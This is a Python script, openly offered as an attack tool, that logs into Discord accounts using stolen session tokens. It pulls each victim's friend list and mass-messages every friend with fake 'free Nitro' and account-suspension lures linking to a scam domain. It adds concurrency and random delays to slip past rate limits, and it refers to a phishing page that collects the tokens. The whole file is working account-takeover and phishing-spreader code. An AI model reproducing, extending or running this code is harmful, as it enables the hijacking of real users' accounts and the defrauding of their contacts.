import requests
import json
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor

# Configuration
TOKENS_FILE = 'stolen_tokens.txt'
SCAM_LINK = 'https://your-scam-domain.com/verify'  # CHANGE THIS
MESSAGE_TEMPLATES = [
    "🚨 FREE NITRO GIVEAWAY! MrBeast is giving away 1000 Nitro subs! Verify here: {link}",
    "🔥 CLAIM YOUR NITRO NOW! Limited time only: {link}",
    "✅ Discord verified me, now you can too! Get free Nitro: {link}",
    "💎 MrBeast just dropped 5000 Nitro codes! Grab yours: {link}",
    "⚠️ Your account will be suspended unless you verify: {link}"
]

def extract_tokens():
    """Read all tokens from the stolen tokens file"""
    tokens = []
    try:
        with open(TOKENS_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                try:
                    # Parse the JSON part
                    parts = line.split(' | ')
                    if len(parts) == 2:
                        data = json.loads(parts[1].strip())
                        if 'token' in data and data['token']:
                            token = data['token'].strip()
                            if len(token) > 30:  # Basic validation
                                tokens.append(token)
                except:
                    continue
    except FileNotFoundError:
        print(f"[ERROR] {TOKENS_FILE} not found")
    return tokens

def validate_token(token):
    """Check if a token is still valid"""
    headers = {'Authorization': token}
    try:
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
        if r.status_code == 200:
            user_data = r.json()
            return True, user_data.get('username', 'Unknown'), user_data.get('id', '0')
        else:
            return False, None, None
    except:
        return False, None, None

def get_friends(token):
    """Get the victim's friend list"""
    headers = {'Authorization': token}
    try:
        r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers, timeout=5)
        if r.status_code == 200:
            friends = r.json()
            return [f['id'] for f in friends if f.get('type') == 1]  # Type 1 = friend
        return []
    except:
        return []

def dm_user(token, user_id, message):
    """Send a DM to a user"""
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    # Create DM channel
    try:
        r = requests.post('https://discord.com/api/v9/users/@me/channels', 
                          headers=headers, 
                          json={'recipient_id': user_id},
                          timeout=5)
        if r.status_code == 200:
            channel_id = r.json()['id']
            # Send message
            r2 = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages',
                              headers=headers,
                              json={'content': message},
                              timeout=5)
            return r2.status_code == 200
        return False
    except:
        return False

def process_account(token, index, total):
    """Process a single account: validate, get friends, DM them"""
    print(f"[{index}/{total}] Processing token: {token[:20]}...")
    
    # Validate
    valid, username, user_id = validate_token(token)
    if not valid:
        print(f"[{index}/{total}] ✗ Token invalid or expired")
        return False
    
    print(f"[{index}/{total}] ✓ Logged in as {username} (ID: {user_id})")
    
    # Get friends
    friends = get_friends(token)
    if not friends:
        print(f"[{index}/{total}] ⚠ No friends found or rate limited")
        return False
    
    print(f"[{index}/{total}] Found {len(friends)} friends")
    
    # Select a random message
    message = random.choice(MESSAGE_TEMPLATES).format(link=SCAM_LINK)
    
    # DM each friend with delay to avoid rate limits
    success_count = 0
    for i, friend_id in enumerate(friends):
        if dm_user(token, friend_id, message):
            success_count += 1
            print(f"[{index}/{total}] DM sent to friend {i+1}/{len(friends)}")
        else:
            print(f"[{index}/{total}] Failed to DM friend {i+1}/{len(friends)}")
        
        # Random delay between 1-5 seconds to avoid rate limits
        time.sleep(random.uniform(1, 3))
    
    print(f"[{index}/{total}] ✓ Sent {success_count}/{len(friends)} DMs")
    return True

def main():
    print("="*60)
    print("DISCORD TOKEN LOGIN & DM SPREADER")
    print("="*60)
    
    # Load tokens
    tokens = extract_tokens()
    if not tokens:
        print("[ERROR] No tokens found. Run the phishing page first.")
        return
    
    print(f"[INFO] Loaded {len(tokens)} tokens")
    
    # Remove duplicates
    tokens = list(dict.fromkeys(tokens))
    print(f"[INFO] {len(tokens)} unique tokens")
    
    # Ask for confirmation
    print(f"\n[WARNING] This will DM ALL friends from {len(tokens)} accounts.")
    print(f"Message: {random.choice(MESSAGE_TEMPLATES).format(link=SCAM_LINK)}")
    response = input("Continue? (y/n): ")
    if response.lower() != 'y':
        print("Aborted.")
        return
    
    # Process accounts with threading (up to 5 at a time)
    print(f"\n[INFO] Starting with 5 concurrent threads...")
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for i, token in enumerate(tokens):
            future = executor.submit(process_account, token, i+1, len(tokens))
            futures.append(future)
            # Small delay between thread submissions
            time.sleep(0.5)
        
        # Wait for all to complete
        for future in futures:
            try:
                future.result()
            except Exception as e:
                print(f"[ERROR] Thread failed: {e}")
    
    print("\n[DONE] All accounts processed.")

if __name__ == '__main__':
    main()
